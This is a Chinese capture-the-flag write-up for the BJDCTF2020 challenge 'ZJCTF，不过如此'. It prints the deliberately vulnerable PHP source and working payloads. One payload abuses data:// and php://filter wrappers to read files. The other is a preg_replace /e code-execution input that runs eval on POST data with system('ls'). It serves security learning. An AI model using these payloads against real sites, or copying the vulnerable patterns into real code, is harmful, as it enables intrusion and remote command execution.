# [BJDCTF2020]ZJCTF，不过如此

## 知识点

`php伪协议`

`php代码审计`

`preg_replace的RCE漏洞`

## 解题

题目源码

```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```

提示读取`next.php`,`payload`

```
?text=data://text/plain,I have a dream&file=php://filter/convert.base64-encode/resource=next.php
```

`next.php`源码

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```

这里主要涉及到`preg_replace`的一个RCE漏洞，参考：<https://xz.aliyun.com/t/2557>

```
preg_replace( '/(' . $re . ')/ei','strtolower("\\1")', $str);
```

主要就是构造`preg_replace('.*')/ei','strtolower("\\1")', {${此处填函数名}});`
大概就是把所有字符替换为函数执行结果。
但是`GET`传`.*=xxx`会出问题，自动将第一个非法字符转化为下划线（看链接），所以构造：

```
/next.php?\S*=${eval($_POST[1])}
```

同时`POST`一个`1=system('ls');`